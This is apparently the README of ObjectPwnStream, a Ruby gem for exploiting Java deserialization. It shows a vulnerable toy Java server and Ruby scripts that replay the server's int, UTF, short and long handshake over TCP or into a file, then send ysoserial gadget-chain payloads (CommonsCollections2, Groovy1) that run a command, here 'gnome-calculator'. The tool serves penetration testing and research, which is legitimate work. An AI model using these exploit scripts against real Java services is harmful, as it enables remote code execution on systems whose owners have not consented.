# ObjectPwnStream

a Ruby implementation of Java's `ObjectInputStream` and `ObjectOutputStream`, to ease the process of Java deserialization exploitation.

the library is currently able to deliver the serialized payloads to TCP connections (`tcpSocket.getInputStream()`) and files (`FileInputStream()`).
## Requirements
- Ruby v3.0.0 or newer

## Installation

Add this line to your application's Gemfile:

```ruby
gem 'ObjectPwnStream'
```

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install ObjectPwnStream

Or install it from main branch:

    $ git clone https://github.com/hakivvi/ObjectPwnStream
    $ cd ObjectPwnStream
    $ bundle install && bundle exec rake install
    
## Documentation
See [ObjectPwnStream wiki page](https://github.com/hakivvi/ObjectPwnStream/wiki/Documentation) for a more detailed gem usage and methods documentation.

## Usage
the library provides a set of methods to mimic the methods of both `ObjectInputStream` and `ObjectOutputStream`,

the `readObject()` method is not always the first function run on a `Socket` or a `FileInputStream`, so you can't just feed the server with your serialized payload or else `java.io.StreamCorruptedException` will be thrown by the server.

take this [test server](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/ToyServer.java) for example, which does read and write a bunch of types before actually calling `readObject()` which the attacker is usually interested in:
```java
                s = serverSock.accept();
                System.out.println("[+] Connection accepted from " + s.getInetAddress().getHostAddress() + ":" + s.getPort());
                
                oos = new ObjectOutputStream(s.getOutputStream());
                ois = new ObjectInputStream(s.getInputStream());

                oos.writeInt(serverVersion);
                oos.flush();
                System.out.printf("[>] writeInt(): 0x%x\n", serverVersion);

                System.out.printf("[<] readInt(): 0x%x\n", ois.readInt());

                oos.writeUTF(serverName);
                oos.flush();
                System.out.printf("[>] writeUTF(): %s\n", serverName);

                System.out.printf("[<] readUTF(): %s\n", ois.readUTF());


                oos.writeShort(0xabcd);
                oos.flush();
                System.out.printf("[>] writeShort(): 0x%x\n", 0xabcd);

                System.out.printf("[<] readShort(): 0x%x\n", ois.readShort());
                
                oos.writeLong(-12345);
                oos.flush();
                System.out.printf("[>] writeLong(): %d\n", -12345);

                System.out.printf("[<] readLong(): %d\n", ois.readLong());


                oos.writeObject(new ToyServer());
                oos.flush();
                System.out.println("[>] writeObject()");

                System.out.println("[<] readObject()");
                try {
                	ois.readObject();
               	} catch (Throwable e) {}
```
to reach the `readObject()` method in this server connection, we should read and write successively `int`, `utf`, `short` etc.
using `ObjectPwnStream` library, we can do just that:
```ruby
require 'ObjectPwnStream'

pwnStream = ObjectPwnStream::PwnStream.new(host: "127.0.0.1", port: 9090)
pwnStream.connect!
pwnStream.open_streams!
pwnStream.read_int
pwnStream.write_int(0x1337)
pwnStream.read_utf
pwnStream.write_utf "ObjectPwnStream"
pwnStream.read_short
pwnStream.write_short(0xabcd)
pwnStream.read_long(signed: true)
pwnStream.write_long(-12345)
pwnStream.read_object
pwnStream.ysoserial_generate!("./ysoserial.jar","CommonsCollections2", "gnome-calculator", encode: true, windows: false)
pwnStream.write_object(ysoserial: true)
```
or as a [`FileInputStream`](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/ToyServerFileMode.java):
```java
        ObjectInputStream fis = new ObjectInputStream(new FileInputStream("/tmp/to_deserialize_file"));

        System.out.printf("got a long from the file: %d\n", fis.readLong());
        try {
            fis.readObject();
        } catch(Throwable e){}
        System.out.println("readObject(): done.");
```
to successfully reach `readObject()`, we should provide a valid `long` type first, the [script](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/test_file_mode.rb) will be:
```ruby
require 'ObjectPwnStream'

pwnStream = ObjectPwnStream::PwnStream.new(file_path: "/tmp/to_deserialize_file")
pwnStream.connect!
pwnStream.open_output_stream!
pwnStream.write_long(12345)
pwnStream.ysoserial_generate!("../ysoserial.jar", "Groovy1", "gnome-calculator", encode: true, windows: false)
pwnStream.write_object(ysoserial: true)
pwnStream.close!
```
## PoC

find a test vulnerable Java server and a Ruby ObjectPwnStream exploit in the [test](https://github.com/hakivvi/ObjectPwnStream/tree/main/spec/test) directory.

![poc](https://user-images.githubusercontent.com/67718634/170808392-1ce8efff-b8c6-4372-8d7a-b20b4fbeadc9.gif)


## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/hakivvi/ObjectPwnStream. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the ObjectPwnStream project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://opensource.guide/code-of-conduct/).

## Todo

- [X] document all the functions.
- [ ] support CLI mode.
